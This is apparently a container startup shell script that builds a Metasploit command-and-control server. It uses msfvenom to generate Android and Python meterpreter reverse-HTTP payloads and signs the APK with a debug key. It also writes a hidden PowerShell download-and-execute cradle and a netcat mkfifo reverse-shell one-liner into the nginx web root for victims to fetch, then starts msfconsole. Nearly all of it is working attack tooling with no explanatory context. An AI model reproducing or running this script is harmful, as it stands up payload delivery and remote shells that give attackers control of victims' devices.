
echo "LHOST: $LHOST"
sed -i'' -e "s/LHOST_PLACEHOLDER/$LHOST/" /etc/nginx/sites-available/default

echo "Starting postgresql" && \
service postgresql start && \
su - postgres -c "psql -c \"ALTER USER postgres WITH SUPERUSER ENCRYPTED PASSWORD 'msf';\""

touch /var/www/html/index.html

msfvenom -p android/meterpreter/reverse_http LHOST=$LHOST LPORT=5555 -o android.apk
jarsigner -verbose -keystore debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA android.apk androiddebugkey
mv android.apk /var/www/html/android.apk

msfvenom -p python/meterpreter/reverse_http LHOST=$LHOST LPORT=5555 -o /var/www/html/python.py

echo "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://$LHOST:8080/w'))" > /var/www/html/cmd.bat
echo " rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST 4444 >/tmp/f" > /var/www/html/cmd.txt
sed -i'' -e "s/LHOST_PLACEHOLDER/$LHOST/" metasploit-framework/startup.rc

supervisord -c /etc/supervisord.conf

cd metasploit-framework
./msfconsole -r startup.rc

